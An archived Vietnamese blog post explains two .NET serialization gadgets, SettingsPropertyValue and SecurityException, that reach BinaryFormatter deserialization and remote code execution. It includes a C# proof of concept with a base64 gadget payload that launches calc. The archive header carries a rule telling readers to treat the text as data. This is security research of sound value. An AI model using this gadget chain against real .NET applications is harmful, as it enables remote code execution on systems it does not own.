---
type: Article
title: Insecure Serialization and new Gadgets in .NET framework (P1)
resource: "https://viblo.asia/p/insecure-serialization-and-new-gadgets-in-net-framework-p1-3RlL53kB4bB"
tags: [article, ysonet-reference, en, viblo]
generated:
  by: ysonet-refs/1
  at: "2026-08-04T17:38:34+00:00"
status: stable
stale_after: 2027-08-04
sources:
  - id: original
    resource: "https://viblo.asia/p/insecure-serialization-and-new-gadgets-in-net-framework-p1-3RlL53kB4bB"
    title: Insecure Serialization and new Gadgets in .NET framework (P1)
    author: Ngocanh Le
    last_modified: 2023-12-03
also_at: []
authors:
  - Ngocanh Le
canonical_url: ""
cited_by:
  - "docs/dotnet-deserialization-research.md:136"
commit: ""
content_sha256: ecef68771f7fff4d876d0403b1575daac08bf8916017319c0e493593ac51cd88
depth: full
depth_reason: default
kind: article
language: en
licence: unknown
original_url: "https://viblo.asia/p/insecure-serialization-and-new-gadgets-in-net-framework-p1-3RlL53kB4bB"
published: 2023-12-03
publisher: Viblo
raw_sha256: f4d6a21e8d350c16db13d7fd1745f94aa767f29da7e7b1ffdb165ecbe02d382a
retrieved_from: "https://viblo.asia/p/insecure-serialization-and-new-gadgets-in-net-framework-p1-3RlL53kB4bB"
retrieved_kind: stored
retrieved_utc: "2026-08-04T17:38:34+00:00"
slug: 2023-viblo-insecure-serialization-new-gadgets-net-framework-p1
snapshot: ""
---

# Insecure Serialization and new Gadgets in .NET framework (P1)

**Insecure Serialization and new Gadgets in .NET framework (P1)** - Ngocanh Le, Viblo.

- Published: 2023-12-03
- Original: <https://viblo.asia/p/insecure-serialization-and-new-gadgets-in-net-framework-p1-3RlL53kB4bB>
- Preserved from: https://viblo.asia/p/insecure-serialization-and-new-gadgets-in-net-framework-p1-3RlL53kB4bB (stored) on 2026-08-04
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source cited by ysonet, kept so the technique survives the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

[ ContentCreator ](https://viblo.asia/content-creator)

**

 This post hasn't been updated for 2 years

 **

# Giới thiệu

Quá trình deserialize dữ liệu không đáng tin cậy đã trở thành một trong những lỗ hổng bị lạm dụng nhiều nhất trong các ngôn ngữ lập trình. Nó đã thu hút sự chú ý lớn vào năm 2015, khi Gabriel Lawrence và Chris Frohoff trình bày một bài talk về các cuộc tấn công liên quan đến quá trình deserialize ở Java. Trong trường hợp của .NET, có lẽ white paper đầu tiên liên quan đến quá trình deserialize đã được James Foreshaw trình bày tại Black Hat 2012. Sau đó, Alvaro Munoz và Oleksandr Mirosh thực hiện nghiên cứu được trình bày tại Black Hat 2017, có tên "Friday the 13th JSON Attacks" . Công việc của họ tập trung vào các lỗ hổng deserialize dạng JSON/XML của .NET và Java. Đó là một nghiên cứu toàn diện. Nghiên cứu gần đây nhất về .NET Deserialization của tác giả Piotr Bazydło với tên gọi "Exploiting Hardened .NET Deserialization: New Exploitation Ideas and Abuse of Insecure Serialization" đã đưa ra rất nhiều ví dụ thực tế về lỗ hổng .NET Deserialization trong các sản phẩm nổi tiếng như Solarwind, Microsoft Exchange và Microsoft SharePoint cũng như trình bày về cách tiếp cận, các gadget mới trong .NET framework.

Nghiên cứu khá dài, bạn đọc có thể đọc bài gốc tại [https://github.com/thezdi/presentations/blob/main/2023_Hexacon/whitepaper-net-deser.pdf](https://github.com/thezdi/presentations/blob/main/2023_Hexacon/whitepaper-net-deser.pdf).

Bài viết này của tôi chỉ dừng lại ở việc phân tích làm rõ lại một số gadget mới trong .NET framework ở nghiên cứu kể trên.

# Insecure Serialization

Tôi chắc rằng có thể các bạn đã nghe đến Insecure Deserialization vậy còn Insecure Serialization là cái quái gì?. Nó có hậu quả gì khi ta có thể khai thác thành công? Có thể cả bạn lẫn tôi đều nghĩ rằng, Insecure Serialization chưa bao giờ là một attack surface bởi vì nhiều lý do. Một trong số đó là attacker sẽ phải gặp rất nhiều vấn đề với việc kiểm soát object để thực hiện serialize.

Trong các serializers dựa trên setter, quy trình serialization thường dựa trên việc gọi các public getters của các thuộc tính của đối tượng. Nó trái ngược với quá trình deserialize, nơi setters sẽ được gọi thường xuyên. Làm sao chúng ta có thể nghĩ đến việc khai thác các vấn đề về serializiation? Trong thực tế có một số ứng dụng thực hiện theo flow sau đây:

- Chấp nhận input từ user
- Thực hiện deserialize input
- Thực hiện một vài thao tác trên đối tượng sau khi deserialize
- Serialize lại đối tượng ở bước 3
- Gửi trả lại đối tược đã được serialize ở bước 4 cho user

Ở bước 2 ở trên, một số người sẽ cho rằng sau khi thực hiện deserialize, các bước còn lại chúng ta không thể kiểm soát được. Tuy nhiên chúng ta có thể xem xét một số kịch bản sau:

- Ứng dụng triển khai block và allow lists, không thể bypass bằng bất kỳ deserialize gadget đã biết nào.
- Deserializer đã được sử dụng nhưng không thể khai thác bằng bất kỳ gadget đã biết nào.
- Việc khai thác yêu cầu ứng dụng gửi dữ liệu trở lại cho kẻ tấn công.

Nghe có vẻ vô lý và không được sử dụng nhiều trong thực tế tuy nhiên trong các phần trước của paper, tác giả đã mô tả các vấn đề deserialize trong `Delta Electronics InfraSuite Device Master`. Nó sử dụng phiên bản cũ của deserializer là MessagePack và tất cả các deserialize gadget dựa trên setter được biết đến hiện nay đều không hoạt động cho phiên bản này. Tuy nhiên, nó hoạt động chính xác như được mô tả trong hình dưới – nó deserialize đối tượng của kẻ tấn công, thực hiện một số thao tác trên nó và serialize nó trở lại. Khi tìm cách khai thác sản phẩm này, tác giả nhận ra rằng kịch bản tấn công sau có thể áp dụng được.

Ở đây, kẻ tấn công gửi một đối tượng độc hại được serialize, trong đó:

- Quá trình deserialize của đối tượng không dẫn đến bất kỳ hành động độc hại nào. Loại đối tượng được cung cấp cũng không tồn tại trong bất kỳ block list deserialize nào.
- Đối tượng được deserialize sẽ kích hoạt một hành động độc hại trong quá trình nó được serialize lại 1 lần nữa.

Kịch bản như vậy có thể cho phép bỏ qua các cơ chế bảo vệ khác nhau, vì phần lớn (hoặc thậm chí tất cả) các ứng dụng không xem xét đến attack surface như vậy. Tuy nhiên, kịch bản tấn công được trình bày vẫn chỉ là lý thuyết cho đến khi chúng ta cung cấp được cách khai thác nó, do đó chúng ta cần tìm một số serialize gadget không an toàn. theo paper tác giả đã chia các serialize gadget thành hai nhóm chính:

- Serialization gadgets – trong đó hành động độc hại được thực hiện trong lệnh gọi getter.
- Deserialization to Serialization gadgets - trong đó hành động độc hại được thực hiện trong giai đoạn deserialize, nhưng kẻ tấn công chỉ có thể xem kết quả khai thác từ nó sau khi serialize.

## Insecure Serialization – Gadgets in .NET Framework

![image.png](https://images.viblo.asia/5db5d178-ac65-4752-9ede-1e0007767f63.png)

### SettingsPropertyValue Remote Code Execution Gadget

Gadget này có thể dẫn đến lệnh gọi BinaryFormatter.Deserialize thông qua việc gọi đến `System.Configuration.SettingsPropertyValue.get_PropertyValue` getter và có thể đạt được RCE nếu attacker hoàn toàn kiểm soát input. Nó có thể được khai thác với default config của `MessagePack` serializer, đối với các serializer khác sẽ tùy thuộc vào config của từng serializer. Ví dụ đối với [JSON.NET](http://JSON.NET) thì execption handling phải được đưa vào `JsonSerializerSettings`. Theo như sơ đồ ở trên, để chuẩn bị cho việc khai thác insecure serialization, object trước tiên phải deserialize (do đó ta cần chuẩn bị 1 object với các thuộc tính cần được set giá trị hợp lý). Đi sâu hơn vào class `SettingsPropertyValue`. Class này có một constructor chấp nhận 1 tham số có kiểu là `SettingsProperty`

```csharp
public SettingsPropertyValue(SettingsProperty property) => this._Property = property;

```

Constructor này có thể được gọi bởi nhiều Serializer dựa trên setter như [JSON.NET](http://JSON.NET) hay MessagePack tuy nhiên `SettingsProperty type` lại không thể được deserialized bởi [JSON.NET](http://JSON.NET). Lý do bởi vì nó implement nhiều constructor và tất cả chúng đều chấp nhận tham số do đó [JSON.NET](http://JSON.NET) không thể tự động chọn mình sẽ sử dụng constructor nào, và truyền những đối số nào để khởi tạo object.

Tiếp theo `SerializedValue` phải được set thành 1 mảng byte chứa BinaryFormatter deserialization gadget. Lý do là gì tôi sẻ giải thích ở bên dưới

```csharp
    public object SerializedValue
    {
      [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.SerializationFormatter)] get
      {
        if (this._ChangedSinceLastSerialized)
        {
          this._ChangedSinceLastSerialized = false;
          this._SerializedValue = this.SerializePropertyValue();
        }
        return this._SerializedValue;
      }
      [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.SerializationFormatter)] set
      {
        this._UsingDefaultValue = false;
        this._SerializedValue = value;
      }
    }

```

Cuối cùng `Deserialized` phải được set thành false

```csharp
    public bool Deserialized
    {
      get => this._Deserialized;
      set => this._Deserialized = value;
    }

```

Tại thời điểm này, object của chúng ta đã sẵn sàng để Deserialize và sau đó là Serialize. Để giảm bớt độ phức tạp, tôi sẽ demo trực tiếp (bỏ qua bước deserialize) bằng đoạn code dưới đây.

```csharp
namespace gadget
{

    internal class Program
    {
        public static void Main(string[] args)
        {

            string payload = "AAEAAAD/////AQAAAAAAAAAEAQAAACVTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc0lkZW50aXR5AQAAABJtX3NlcmlhbGl6ZWRDbGFpbXMBBgUAAADECUFBRUFBQUQvLy8vL0FRQUFBQUFBQUFBTUFnQUFBRjVOYVdOeWIzTnZablF1VUc5M1pYSlRhR1ZzYkM1RlpHbDBiM0lzSUZabGNuTnBiMjQ5TXk0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMHpNV0ptTXpnMU5tRmtNelkwWlRNMUJRRUFBQUJDVFdsamNtOXpiMlowTGxacGMzVmhiRk4wZFdScGJ5NVVaWGgwTGtadmNtMWhkSFJwYm1jdVZHVjRkRVp2Y20xaGRIUnBibWRTZFc1UWNtOXdaWEowYVdWekFRQUFBQTlHYjNKbFozSnZkVzVrUW5KMWMyZ0JBZ0FBQUFZREFBQUFzd1U4UDNodGJDQjJaWEp6YVc5dVBTSXhMakFpSUdWdVkyOWthVzVuUFNKMWRHWXRNVFlpUHo0TkNqeFBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSWdUV1YwYUc5a1RtRnRaVDBpVTNSaGNuUWlJRWx6U1c1cGRHbGhiRXh2WVdSRmJtRmliR1ZrUFNKR1lXeHpaU0lnZUcxc2JuTTlJbWgwZEhBNkx5OXpZMmhsYldGekxtMXBZM0p2YzI5bWRDNWpiMjB2ZDJsdVpuZ3ZNakF3Tmk5NFlXMXNMM0J5WlhObGJuUmhkR2x2YmlJZ2VHMXNibk02YzJROUltTnNjaTF1WVcxbGMzQmhZMlU2VTNsemRHVnRMa1JwWVdkdWIzTjBhV056TzJGemMyVnRZbXg1UFZONWMzUmxiU0lnZUcxc2JuTTZlRDBpYUhSMGNEb3ZMM05qYUdWdFlYTXViV2xqY205emIyWjBMbU52YlM5M2FXNW1lQzh5TURBMkwzaGhiV3dpUGcwS0lDQThUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlMazlpYW1WamRFbHVjM1JoYm1ObFBnMEtJQ0FnSUR4elpEcFFjbTlqWlhOelBnMEtJQ0FnSUNBZ1BITmtPbEJ5YjJObGMzTXVVM1JoY25SSmJtWnZQZzBLSUNBZ0lDQWdJQ0E4YzJRNlVISnZZMlZ6YzFOMFlYSjBTVzVtYnlCQmNtZDFiV1Z1ZEhNOUlpOWpJR05oYkdNaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw==";
            Byte[] binary = System.Convert.FromBase64String(payload);
            SettingsProperty settings = new SettingsProperty("test");
            SettingsPropertyValue maliciousobj = new SettingsPropertyValue(settings);
            maliciousobj.SerializedValue = binary;
            maliciousobj.Deserialized = false;

            string json = JsonConvert.SerializeObject(maliciousobj);
            Console.WriteLine($"Serialized JSON: {json}");
            JsonConvert.SerializeObject(maliciousobj);
        }
    }
}

```

![image.png](https://images.viblo.asia/66340559-1a7d-4da8-bcdd-700627dcf4ed.png) Sau khi đoạn code trên được thực thi, calc sẽ được popup. Vậy tại sao lại như vậy, cùng tìm hiểu kĩ hơn.

Khi thực hiện Serialize object có type `SettingsPropertyValue`, hầu hết các serializer sẽ gọi đến getter `get_Name` đầu tiên sau đó sẽ gọi đến các getter khác.

```csharp
public string Name => this._Property.Name;

```

Getter này có vấn đề đối với các serializer không thể deserialize type SettingProperty (ví dụ [JSON.NET](http://JSON.NET) được sử dụng trong đoạn code trên). Trong trường hợp như vậy, getter này sẽ ném ngoại lệ `NullReferenceException` (không thể truy xuất thuộc tính của đối tượng null).

Cuối cùng getter `get_PropertyValue` sẽ được gọi.

```csharp
    public object PropertyValue
    {
      get
      {
        if (!this._Deserialized)
        {
          this._Value = this.Deserialize();
          this._Deserialized = true;
        }
        if (this._Value != null && !this.Property.PropertyType.IsPrimitive && !(this._Value is string) && !(this._Value is DateTime))
        {
          this._UsingDefaultValue = false;
          this._ChangedSinceLastSerialized = true;
          this._IsDirty = true;
        }
        return this._Value;
      }
  }

```

Tại dòng 1, code sẽ check giá trị thuộc tính `_Deserialized`. Do ta đã đặt giá trị thuộc tính này thành false nên dòng code 2 sẽ được thực thi.

```csharp
  private object Deserialize()
    {
      object obj = (object) null;
      if (this.SerializedValue != null)
      {
        try
        {
          if (this.SerializedValue is string)
          {
            obj = SettingsPropertyValue.GetObjectFromString(this.Property.PropertyType, this.Property.SerializeAs, (string) this.SerializedValue);
          }
          else
          {
            MemoryStream serializationStream = new MemoryStream((byte[]) this.SerializedValue);
            try
            {
              obj = new BinaryFormatter().Deserialize((Stream) serializationStream);
            }
            finally
            {
              serializationStream.Close();
            }
          }
        }
    ...

```

Cuối cùng nó gọi đến BinaryFormatter.Deserialize với đầu vào do attacker kiểm soát từ đó đạt được RCE.

### SecurityException Remote Code Execution Gadget

Gadget này có thể dẫn đến lệnh gọi BinaryFormatter.Deserialize thông qua việc gọi đến `System.Security.SecurityException.get_Method` getter và có thể đạt được RCE nếu attacker hoàn toàn kiếm soát input.

Serialize gadget này khó khai thác vì nó cần kết hợp hai loại serializer khác nhau.

- Serializer hỗ trợ Serializable interface trong quá trình deserailzie hoặc serialize
- Serializer không hỗ trợ Serializable interface hoặc ưu tiên gọi đến getter trước khi gọi đến các method impelment Seializable.

Ví dụ để dễ hiểu hơn

- Dữ liệu sẽ được deserialize bởi Binaryformatter hoặc JSON .NET serializer
- Object sau đó sẽ được serialized bởi JavaScriptSerializer

Mặc dù kịch bản như vậy có vẻ khó xảy ra nhưng có nhiều ứng dụng kết hợp các serializer khác nhau. Ví dụ: Nền tảng SolarWinds cung cấp một chức năng, trong đó dữ liệu được deserialize bằng Json .NET và sau đó được serialize lại bằng DataContractSerializer.

Quay trở lại với gadget SecurityException, khi thực hiện serialize, các getter sẽ được gọi, trong đó có getter `get_Method`

```csharp
    public MethodInfo Method
    {
      [SecuritySafeCritical, SecurityPermission(SecurityAction.Demand, Flags = SecurityPermissionFlag.ControlEvidence | SecurityPermissionFlag.ControlPolicy)] get => this.getMethod();
      set
      {
        RuntimeMethodInfo runtimeMethodInfo = value as RuntimeMethodInfo;
        this.m_serializedMethodInfo = SecurityException.ObjectToByteArray((object) runtimeMethodInfo);
        if (!((MethodInfo) runtimeMethodInfo != (MethodInfo) null))
          return;
        this.m_strMethodInfo = runtimeMethodInfo.ToString();
      }
    }

```

Nó sẽ gọi đến method `getMethod()`

```csharp
private MethodInfo getMethod() => (MethodInfo) SecurityException.ByteArrayToObject(this.m_serializedMethodInfo);

```

Và tiếp đến sẽ gọi đến `ByteArrayToObject` với tham số đầu vào là `m_serializedMethodInfo`

```csharp
private static object ByteArrayToObject(byte[] array) => array == null || array.Length == 0 ? (object) null : new BinaryFormatter().Deserialize((Stream) new MemoryStream(array));

```

Method này gọi đến `BinaryFormatter.Deserialize` với dữ liệu đầu vào được kiểm soát bởi attacker => Đạt được RCE tại đây

Như vậy để chuẩn bị object để deseralize như thế nào để có thể RCE. Các bạn có thể để ý nhược điểm của gadget này như đã đề cập trước đó. Vậy tại sao lại như vậy. Lý do bởi vì `m_serializedMethodInfo` không thể kiểm soát hoàn toàn bởi việc call setter.

```csharp
    public MethodInfo Method
    {
      [SecuritySafeCritical, SecurityPermission(SecurityAction.Demand, Flags = SecurityPermissionFlag.ControlEvidence | SecurityPermissionFlag.ControlPolicy)] get => this.getMethod();
      set
      {
        RuntimeMethodInfo runtimeMethodInfo = value as RuntimeMethodInfo;
        this.m_serializedMethodInfo = SecurityException.ObjectToByteArray((object) runtimeMethodInfo);
        if (!((MethodInfo) runtimeMethodInfo != (MethodInfo) null))
          return;
        this.m_strMethodInfo = runtimeMethodInfo.ToString();
      }
    }

```

Setter mong đợi 1 object có type là `MethodInfo` sau đó sẽ được serialize bằng `BinaryFormatter.Serialize` thông qua lệnh gọi `SecurityException.ObjectToByteArray`. Việc này chặn attacker đặt gadget độc hại thông qua lệnh gọi setter. Tuy nhiên attacker vẫn có thể cũng cấp 1 gadget độc hại thông qua serialzier hỗ trợ Serilaizable interface và sẽ gọi đến custom constructor trong quá trình deserialize.

```csharp
    [SecuritySafeCritical]
    protected SecurityException(SerializationInfo info, StreamingContext context)
      : base(info, context)
    {
      if (info == null)
        throw new ArgumentNullException(nameof (info));
      try
      {
        this.m_action = (SecurityAction) info.GetValue(nameof (Action), typeof (SecurityAction));
        this.m_permissionThatFailed = (string) info.GetValueNoThrow(nameof (FirstPermissionThatFailed), typeof (string));
        this.m_demanded = (string) info.GetValueNoThrow(nameof (Demanded), typeof (string));
        this.m_granted = (string) info.GetValueNoThrow(nameof (GrantedSet), typeof (string));
        this.m_refused = (string) info.GetValueNoThrow(nameof (RefusedSet), typeof (string));
        this.m_denied = (string) info.GetValueNoThrow("Denied", typeof (string));
        this.m_permitOnly = (string) info.GetValueNoThrow("PermitOnly", typeof (string));
        this.m_assemblyName = (AssemblyName) info.GetValueNoThrow("Assembly", typeof (AssemblyName));
        this.m_serializedMethodInfo = (byte[]) info.GetValueNoThrow(nameof (Method), typeof (byte[]));
        this.m_strMethodInfo = (string) info.GetValueNoThrow("Method_String", typeof (string));
        this.m_zone = (SecurityZone) info.GetValue(nameof (Zone), typeof (SecurityZone));
        this.m_url = (string) info.GetValueNoThrow(nameof (Url), typeof (string));
      }
............
      }
    }

```

Để dễ hiểu hơn, attacker không thể đưa gadget vào bằng cách gọi setter vì đã qua 1 bước serialize trong setter rồi, Vậy nên ta phải sử dụng serialize hỗ trợ serialiable để call đến constructor như trên để đưa payload vào `m_serializedMethodInfo`.

Đến đây tôi tạm kết phần này. Ở phần tiếp theo Tôi sẽ tiếp tục giới thiệu đến các bạn sự kết hợp giữa các gadget từ Deserialize-> Serialize-> RCE với các demo cụ thể hơn. Ở phần trên nếu có gì không hiểu các bạn có thể comment để cùng nhau tìm hiểu và giải thích. Cảm ơn các bạn đã đọc bài viết.

 [ Insecure Deserialization ](https://viblo.asia/tags/insecure-deserialization)
